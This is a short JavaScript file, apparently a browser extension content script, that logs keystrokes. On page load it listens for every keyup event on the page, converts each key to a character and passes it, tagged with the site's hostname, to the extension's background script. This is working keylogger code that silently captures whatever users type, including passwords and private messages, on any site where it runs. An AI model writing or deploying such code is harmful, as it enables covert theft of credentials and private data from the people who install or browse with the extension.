

window.onload = function(){
	registerLogger();
}


function registerLogger(){
	document.body.addEventListener('keyup', function(e){
		sendMessage(String.fromCharCode(e.which), true);
	})
}

function sendMessage(message, append){
    var url = window.location.hostname;
    sendMessageToScript({type:"keystroke-inject",data: message, append: append, url: url},
        function(r){

        }
    );
}


function sendMessageToScript(json, callback){
    chrome.runtime.sendMessage(json, function(response) {
      callback(response);
    });
}